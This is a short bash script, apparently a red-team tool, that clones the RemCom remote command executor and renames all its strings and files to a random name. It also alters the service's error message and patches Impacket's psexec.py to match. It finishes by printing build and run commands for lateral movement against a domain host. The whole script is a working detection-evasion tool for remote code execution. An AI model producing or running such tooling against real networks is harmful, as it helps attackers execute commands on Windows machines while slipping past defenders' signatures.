#!/usr/bin/env bash
set -e

# --- Configuration ---
SEARCH="RemCom"
# Generate random 8-letter alphabetic string
REPLACE=$(cat /dev/urandom | tr -dc '[:alpha:]' | fold -w 8 | head -n 1)
SAFE_REPLACE=$(printf '%s\n' "$REPLACE" | sed 's/[&/\]/\\&/g')

echo "[*] Using replacement name: ${REPLACE}"

# --- Clone original repo ---
git clone -q https://github.com/kavika13/RemCom RemComObf

# --- Replace occurrences in all files ---
find RemComObf -type f -exec sed -i "s/${SEARCH}/${SAFE_REPLACE}/g" {} +

# --- Modify message in Service.cpp ---
sed -i "s/A service Cannot be started directly./Nothing's here.../g" RemComObf/RemComSvc/Service.cpp

# --- Rename files ---
mv RemComObf/${SEARCH}.cpp RemComObf/${REPLACE}.cpp
mv RemComObf/${SEARCH}.h RemComObf/${REPLACE}.h
mv RemComObf/${SEARCH}.rc RemComObf/${REPLACE}.rc
mv RemComObf/${SEARCH}.vcxproj RemComObf/${REPLACE}.vcxproj

mv RemComObf/RemComSvc/${SEARCH}Svc.cpp RemComObf/RemComSvc/${REPLACE}Svc.cpp
mv RemComObf/RemComSvc/${SEARCH}Svc.h RemComObf/RemComSvc/${REPLACE}Svc.h
mv RemComObf/RemComSvc/${SEARCH}Svc.vcxproj RemComObf/RemComSvc/${REPLACE}Svc.vcxproj

# Rename the project folder itself
mv RemComObf/RemComSvc RemComObf/${REPLACE}Svc

# --- Update Impacket psexec reference ---
git clone -q https://github.com/fortra/impacket
sed -i "s/${SEARCH}_/${SAFE_REPLACE}_/g" impacket/examples/psexec.py

# --- Output build instructions ---
echo
echo "[*] Replacement successful."
echo "[*] New project folder: RemComObf/${REPLACE}Svc"
echo "[*] Compile command:"
echo "    MSBuild.exe 'Remote Command Executor.sln' /t:${REPLACE}:Rebuild /p:Configuration=Release /p:PlatformToolset=v143"
echo
echo "[*] Example run command:"
echo "    python3 impacket/examples/psexec.py megacorp.local/snovvcrash@192.168.1.11 -file RemComObf/${REPLACE}Svc/Release/${REPLACE}Svc.exe"
echo
